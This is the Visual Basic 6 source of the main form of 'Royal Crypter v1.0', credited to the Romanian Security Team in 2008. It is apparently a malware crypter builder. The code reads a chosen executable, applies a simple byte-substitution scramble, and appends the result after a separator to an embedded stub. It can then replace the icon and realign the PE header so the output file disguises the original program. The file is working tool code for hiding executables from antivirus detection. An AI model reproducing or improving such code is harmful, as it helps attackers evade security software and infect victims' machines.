VERSION 5.00
Begin VB.Form Form1 
   BorderStyle     =   1  'Fixed Single
   Caption         =   "Royal Crypter v1.0"
   ClientHeight    =   2355
   ClientLeft      =   5835
   ClientTop       =   4950
   ClientWidth     =   7395
   Icon            =   "Form1.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   Picture         =   "Form1.frx":030A
   ScaleHeight     =   2355
   ScaleWidth      =   7395
   Begin CrypterProject.ccXPButton ccXPButton3 
      Height          =   345
      Left            =   2880
      TabIndex        =   4
      Top             =   1800
      Width           =   1575
      _ExtentX        =   2778
      _ExtentY        =   609
      Caption         =   "Crypt"
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Arial"
         Size            =   9.75
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
   End
   Begin CrypterProject.ccXPButton ccXPButton2 
      Height          =   345
      Left            =   5640
      TabIndex        =   3
      Top             =   1320
      Width           =   1335
      _ExtentX        =   2355
      _ExtentY        =   609
      Caption         =   "Browse"
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Verdana"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
   End
   Begin CrypterProject.ccXPButton ccXPButton1 
      Height          =   345
      Left            =   5640
      TabIndex        =   2
      Top             =   915
      Width           =   1335
      _ExtentX        =   2355
      _ExtentY        =   609
      Caption         =   "Browse"
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Verdana"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
   End
   Begin VB.TextBox Text2 
      Height          =   350
      Left            =   1200
      TabIndex        =   1
      Top             =   1320
      Width           =   4215
   End
   Begin VB.TextBox Text1 
      Height          =   350
      Left            =   1200
      TabIndex        =   0
      Top             =   915
      Width           =   4215
   End
   Begin VB.Label Label2 
      BackStyle       =   0  'Transparent
      Caption         =   "Icon : "
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   12
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   375
      Left            =   360
      TabIndex        =   6
      Top             =   1320
      Width           =   735
   End
   Begin VB.Label Label1 
      BackStyle       =   0  'Transparent
      Caption         =   "File : "
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   12
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   375
      Left            =   360
      TabIndex        =   5
      Top             =   960
      Width           =   615
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
' #################################
'      Royal Crypter v1.0
'       (c) Nytro 2008
' http://www.rstcenter.com/forum/
' (c) Romanian Security Team 2008
' #################################

Private Sub ccXPButton1_Click()

' Se alege un executabil

  Dim sExe As String
  sExe = GetFileName(Text1.Text, "Executables|*.exe")
  If sExe <> "" Then Text1.Text = sExe
  
End Sub

Private Sub ccXPButton2_Click()

' Se alege o iconita

  Dim sIco As String
  sIco = GetFileName(Text2.Text, "Icons|*.ico")
  If sIco <> "" Then Text2.Text = sIco
  
End Sub

Private Sub ccXPButton3_Click()

If Text1.Text <> "" Then

' Variabilele de care vom avea nevoie

Dim Errx As String
Dim i As Long
Dim biti() As Byte
Dim stub() As Byte

' Separatorul ca vector

Dim leet(3) As Byte
leet(0) = 35 '#
leet(1) = 51 '3
leet(2) = 49 '1
leet(3) = 35 '#

' Citim fiserul

Open Text1.Text For Binary As #1
ReDim biti(LOF(1) - 1)
Get #1, 3, biti     ' Nu citim primele 2 caractere care reprezinta semnatura MZ, o vom scrie automat
Close #1

' Cryptam cu un algoritm "extrem de complex" fisierul

For i = 0 To UBound(biti)

  If biti(i) <= 31 Then
     biti(i) = biti(i) + 65
  ElseIf biti(i) >= 65 And biti(i) <= 96 Then
     biti(i) = biti(i) - 65
  End If
  
Next

' Adaugam peste stub fiserul

Open App.Path & "\Crypted File.exe" For Binary As #2
stub = LoadResData(101, "CUSTOM")
Put #2, , stub  ' Stub
Put #2, , leet  ' Separator
Put #2, , biti  ' Fisier modificat
Close #2

' Daca s-a ales o iconita o schimbam

If Text2.Text <> "" Then
ReplaceIcons Text2.Text, App.Path & "\Crypted File.exe", Errx
End If

' Extindem lungimea ultimei sectiuni ca sa o acopere

ReAlignHeader App.Path & "\Crypted File.exe"

' Afisam un mesaj

MsgBox "File " & App.Path & "\Crypted File.exe" & " crypted ! " & vbCrLf & "Please visit : http://www.rstcenter.com", vbInformation, "Royal Crypter"

' Si gata

End If

End Sub


